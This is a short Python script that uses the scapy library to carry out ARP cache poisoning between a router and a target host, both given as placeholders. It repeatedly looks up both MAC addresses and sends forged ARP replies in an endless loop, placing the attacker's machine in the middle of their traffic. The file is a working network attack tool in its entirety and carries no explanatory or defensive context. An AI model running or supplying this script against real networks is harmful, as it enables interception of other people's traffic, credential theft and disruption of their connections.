import scapy.all as scapy
import time

gateway_ip = "TARGET_ROUTER"
target_ip = "TARGET_IP"


def spoof(target_ip, target_mac, spoof_ip):
    spoof_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
    scapy.send(spoof_packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, _empty_ = scapy.srp(arp_request, timeout=3, verbose=False)
    if reply:
        return reply[0][1].src
    else:
        return None


def wait_til_mac(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if mac is None:
            print(f"Waiting for MAC address of {ip}...")
            time.sleep(1)
    return mac


try:
    while True:
        spoof(
            target_ip=gateway_ip,
            target_mac=wait_til_mac(gateway_ip),
            spoof_ip=target_ip,
        )
        spoof(
            target_ip=target_ip, target_mac=wait_til_mac(target_ip), spoof_ip=gateway_ip
        )
        time.sleep(1)
        print("spoofed")
except KeyboardInterrupt:
    print("stopped")
